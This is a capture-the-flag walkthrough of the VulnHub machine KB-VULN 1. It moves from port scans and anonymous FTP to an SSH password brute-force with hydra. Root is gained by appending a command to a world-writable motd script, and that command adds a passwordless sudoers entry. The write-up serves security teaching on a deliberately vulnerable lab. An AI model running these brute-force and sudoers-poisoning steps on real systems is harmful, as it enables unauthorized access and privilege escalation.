
# KB-VULN 1 - CTF

Available on VulnHub: https://www.vulnhub.com/entry/kb-vuln-1,540/


## IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.184   08:00:27:09:6b:fc      1      60  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## Port Scanning

```
$ nmap -AT4 -p- 192.168.1.184
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-01 11:43 -03
Nmap scan report for 192.168.1.184
Host is up (0.00035s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.189
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:84:46:ae:47:21:d1:73:7d:2f:0a:66:87:98:af:d3 (RSA)
|   256 af:79:86:77:00:59:3e:ee:cf:6e:bb:bc:cb:ad:96:cc (ECDSA)
|_  256 9d:4d:2a:a1:65:d4:f2:bd:5b:25:22:ec:bc:6f:66:97 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: OneSchool &mdash; Website by Colorlib
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.37 seconds
```

## FTP Analysis

Login via FTP with anonymous credentials:
```
$ ftp 192.168.1.184

Connected to 192.168.1.184.
220 (vsFTPd 3.0.3)
Name (192.168.1.184:burton): anonymous
331 Please specify the password.
Password: anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    2 1000     1000         4096 Aug 22  2020 .
drwxrwxr-x    2 1000     1000         4096 Aug 22  2020 ..
-rw-r--r--    1 0        0              54 Aug 22  2020 .bash_history
226 Directory send OK.
```

Acquiring `.bash_history` file:
```
ftp> get .bash_history

local: .bash_history remote: .bash_history
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .bash_history (54 bytes).
226 Transfer complete.
54 bytes received in 0.00 secs (16.2760 kB/s)
```

```
$ cat .bash_history

exit
ls
cd /etc/update-motd.d/
ls
nano 00-header
exit
```

This file `/etc/update-motd.d/00-header` may be interesting.

## Web Analysis

```
$ dirb http://192.168.1.184

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Apr  1 11:45:57 2021
URL_BASE: http://192.168.1.184/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.184/ ----
==> DIRECTORY: http://192.168.1.184/css/                                                                             
==> DIRECTORY: http://192.168.1.184/fonts/                                                                           
==> DIRECTORY: http://192.168.1.184/images/                                                                          
+ http://192.168.1.184/index.html (CODE:200|SIZE:25578)                                                              
==> DIRECTORY: http://192.168.1.184/js/                                                                              
+ http://192.168.1.184/server-status (CODE:403|SIZE:278)                                                             
                                                                                                                     
---- Entering directory: http://192.168.1.184/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.184/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.184/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.184/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Thu Apr  1 11:46:00 2021
DOWNLOADED: 4612 - FOUND: 2
```

```
$ nikto -h http://192.168.1.184

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.184
+ Target Hostname:    192.168.1.184
+ Target Port:        80
+ Start Time:         2021-04-01 11:46:09 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: 63ea, size: 5ad7b006c93b4, mtime: gzip
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2021-04-01 11:46:34 (GMT-3) (25 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
$ gobuster dir -t 50 -u http://192.168.1.184 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.js,/,.html

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.184
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,txt,js,/
[+] Timeout:                 10s
===============================================================
2021/04/01 11:47:57 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://192.168.1.184/images/]
/index.html           (Status: 200) [Size: 25578]                                 
/css                  (Status: 301) [Size: 312] [--> http://192.168.1.184/css/]   
/js                   (Status: 301) [Size: 311] [--> http://192.168.1.184/js/]    
/fonts                (Status: 301) [Size: 314] [--> http://192.168.1.184/fonts/] 
/server-status        (Status: 403) [Size: 278]                                   
                                                                                  
===============================================================
2021/04/01 11:51:36 Finished
===============================================================
```

I did not find nothing with Web Analysis result.

## Page Source Analysis

The username can be found on web page source.
```
.
..
...
<!-- Username : sysadmin -->
...
..
.
```

## SSH Brute Forcing

```
$ hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt 192.168.1.184 -f -t 32 ssh

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-01 12:04:20
[DATA] max 32 tasks per 1 server, overall 32 tasks, 501 login tries (l:1/p:501), ~16 tries per task
[DATA] attacking ssh://192.168.1.184:22/
[22][ssh] host: 192.168.1.184   login: sysadmin   password: password1
[STATUS] attack finished for 192.168.1.184 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-01 12:04:31
```

Credentials:
* User: **sysadmin**
* Pass: **password1**

## SSH Access

```
$ ssh sysadmin@192.168.1.184
sysadmin@192.168.1.184's password: password1

WELCOME TO THE KB-SERVER
Last login: Thu Apr  1 15:08:34 2021 from 192.168.1.189
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

sysadmin@kb-server:~$ id
uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

## Flag #1 - User

```
sysadmin@kb-server:~$ cat user.txt
48a365b4ce1e322a55ae9017f3daf0c0
```

## Checking /etc/update-motd.d/00-header File

This is a full permission file:
```
sysadmin@kb-server:~$ ls -lah /etc/update-motd.d/00-header 
-rwxrwxrwx 1 root root 989 Aug 22  2020 /etc/update-motd.d/00-header
```

Validating vector:
```
sysadmin@kb-server:~$ echo "id" >> /etc/update-motd.d/00-header
sysadmin@kb-server:~$ exit

$ ssh sysadmin@192.168.1.184
sysadmin@192.168.1.184's password: password1

WELCOME TO THE KB-SERVER

uid=0(root) gid=0(root) groups=0(root)

Last login: Thu Apr  1 16:00:49 2021 from 192.168.1.189
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

## Privilege Escalation

Poisoning `/etc/sudoers` file:
```
sysadmin@kb-server:~$ echo "echo \"sysadmin ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers" >> /etc/update-motd.d/00-header
sysadmin@kb-server:~$ exit

$ ssh sysadmin@192.168.1.184
sysadmin@192.168.1.184's password: password1

WELCOME TO THE KB-SERVER
Last login: Thu Apr  1 18:57:02 2021 from 192.168.1.189

sysadmin@kb-server:~$ sudo bash
root@kb-server:~#

root@kb-server:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## Flag #2 - Root

```
root@kb-server:~# cat /root/flag.txt 
1eedddf9fff436e6648b5e51cb0d2ec7
```
